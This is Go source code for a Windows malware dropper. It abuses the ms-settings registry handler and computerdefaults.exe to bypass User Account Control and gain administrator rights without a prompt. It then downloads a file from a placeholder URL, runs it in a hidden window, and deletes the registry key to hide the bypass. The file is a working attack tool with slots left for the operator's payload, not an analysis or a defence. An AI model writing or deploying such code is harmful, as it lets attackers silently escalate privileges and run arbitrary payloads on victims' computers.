package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows"
	"os/user"
)

func main() {
	err := runAsAdmin()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
}

func runAsAdmin() error {
	isAdmin, err := isAdmin()
	if err != nil {
		return err
	}

	if !isAdmin {
		return getUAC()
	}

	fileUrl := "" // Direct download link of your file
	tempPath := os.TempDir() + string(os.PathSeparator) + "" // Name of your file
	fmt.Println("File downloaded at ", tempPath)


	err = downloadFile(fileUrl, tempPath)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd.exe", "/c", "start", tempPath)
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	err = cmd.Run()
	if err != nil {
		return err
	}


	err = deleteSubKeyTree(registry.CURRENT_USER, `Software\Classes\ms-settings\shell`)
	return err
}

func downloadFile(url, filePath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func getUAC() error {
	usr, err := user.Current()
	if err != nil {
		return err
	}

	if usr.Uid != "S-1-5-32-544" { 
		registryPaths := []string{
			"Classes",
			"Classes\\ms-settings",
			"Classes\\ms-settings\\shell",
			"Classes\\ms-settings\\shell\\open",
		}

		for _, path := range registryPaths {
			_, err := openRegSubKey(path)
			if err != nil {
				return err
			}
		}

		key, err := openRegSubKey("Classes\\ms-settings\\shell\\open\\command")
		if err != nil {
			return err
		}
		defer key.Close()

		exePath, _ := os.Executable()
		err = key.SetStringValue("", exePath)
		if err != nil {
			return err
		}
		err = key.SetDWordValue("DelegateExecute", 0)
		if err != nil {
			return err
		}

		cmd := exec.Command("cmd.exe", "/c", "start computerdefaults.exe")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		err = cmd.Run()
		if err != nil {
			return err
		}
	}

	return nil
}

func openRegSubKey(path string) (registry.Key, error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\`+path, registry.ALL_ACCESS)
	if err == registry.ErrNotExist {
		key, _, err = registry.CreateKey(registry.CURRENT_USER, `Software\`+path, registry.ALL_ACCESS)
	}
	return key, err
}

func deleteSubKeyTree(k registry.Key, path string) error {
	key, err := registry.OpenKey(k, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()

	subkeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return err
	}

	for _, subkey := range subkeys {
		err = deleteSubKeyTree(key, subkey)
		if err != nil {
			return err
		}
	}

	key.Close()
	return registry.DeleteKey(k, path)
}

func isAdmin() (bool, error) {
	var sid *windows.SID
	sid, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
	if err != nil {
		return false, err
	}

	token := windows.Token(0)
	return token.IsMember(sid)
}
